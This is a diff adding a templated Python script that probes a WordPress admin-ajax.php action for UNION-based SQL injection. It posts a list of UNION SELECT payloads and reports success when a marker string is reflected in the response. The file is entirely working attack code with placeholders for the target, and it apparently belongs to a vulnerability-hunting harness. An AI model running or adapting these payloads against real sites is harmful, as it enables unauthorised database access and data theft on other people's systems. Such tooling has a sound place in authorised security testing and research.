@@ -1,0 +1,38 @@
+import re
+import requests
+
+TARGET = "{{ target_url }}"
+ACTION = "{{ ajax_action }}"
+PARAM  = "{{ injectable_param }}"
+
+# Marker we expect to see echoed back, proving column reflection works.
+MARKER = "WPVH_MARKER_98271"
+
+PAYLOADS = [
+    f"' UNION SELECT '{MARKER}'-- -",
+    f"' UNION SELECT '{MARKER}',NULL-- -",
+    f"' UNION SELECT NULL,'{MARKER}'-- -",
+    f"' UNION SELECT '{MARKER}',NULL,NULL-- -",
+    f"-1 UNION SELECT '{MARKER}'-- -",
+    f"-1 UNION SELECT '{MARKER}',NULL-- -",
+]
+
+def test(payload: str) -> tuple[bool, int, str]:
+    resp = requests.post(
+        f"{TARGET}/wp-admin/admin-ajax.php",
+        data={"action": ACTION, PARAM: payload},
+        timeout=30,
+    )
+    return MARKER in resp.text, resp.status_code, resp.text[:300]
+
+if __name__ == "__main__":
+    print(f"[*] Testing UNION SQLi: action={ACTION} param={PARAM}")
+    for p in PAYLOADS:
+        ok, status, body = test(p)
+        if ok:
+            print(f"[+] SUCCESS payload={p!r} status={status}")
+            print(f"    response excerpt: {body!r}")
+            break
+        print(f"[-] No reflection (status={status}): {p!r}")
+    else:
+        print("[!] FAILURE: no UNION SQLi confirmed")
